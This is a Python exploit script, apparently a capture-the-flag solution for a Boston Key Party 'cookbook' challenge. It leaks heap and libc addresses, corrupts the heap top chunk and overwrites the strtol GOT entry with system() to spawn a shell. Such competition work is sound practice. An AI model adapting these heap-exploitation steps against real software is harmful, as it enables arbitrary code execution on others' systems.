#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwnpwnpwn import *
import re

#host = "10.211.55.23"
#port = 8888

host = "cookbook.bostonkey.party"
port = 5000

sock = make_conn(host,port)

def createri(sock):
    recvuntil(sock,"[q]uit")
    sendline(sock,"c")

def newri(sock):
    recvuntil(sock,"[q]uit")
    sendline(sock,"n")

def delri(sock):
    recvuntil(sock,"[q]uit")
    sendline(sock,"d")

def addingr(sock,name,num):
    recvuntil(sock,"[q]uit")
    sendline(sock,"a")
    recvuntil(sock,"add?")
    sendline(sock,name)
    recvuntil(sock,"(hex)")
    sendline(sock,str(num))

def printri(sock):
    recvuntil(sock,"[q]uit")
    sendline(sock,"p")
    data = recvuntil(sock,"total cals")
    return data

def quit(sock):
    recvuntil(sock,"[q]uit")
    sendline(sock,"q")

def newcook(sock,size,content):
    recvuntil(sock,"[q]uit")
    sendline(sock,"g")
    recvuntil(sock,":")
    sendline(sock,hex(size)[2:])
    sendline(sock,content)


recvuntil(sock,"?")
sendline(sock,"ddaa")

calloc_got = 0x804d048
strtlgot = 0x804d038
createri(sock)
newri(sock)
addingr(sock,"water",1)
delri(sock)
data = printri(sock)
heap =  int(data.split("(null)\n\n")[1].split("-")[0].strip()) - 0x16d8
print hex(heap)
quit(sock)
newcook(sock,0x400,pack32(calloc_got)*2)
createri(sock)
data = printri(sock)
libc =  int(data.split()[5]) + 0x100000000 - 0x73be0
print hex(libc)
system = libc +0x3b160
sh = 0x804a4c7
newri(sock)
delri(sock)
quit(sock)
newcook(sock,0x90,"a"*0x20)
createri(sock)
recvuntil(sock,"uit")
sendline(sock,"g")
sendline(sock,pack32(0)*2 + pack32(0xffffffff))
quit(sock)
top = heap + 0x1770
newcook(sock,strtlgot-4-8-top+0x100000000,"")
newcook(sock,0x30,pack32(system))
inter(sock)
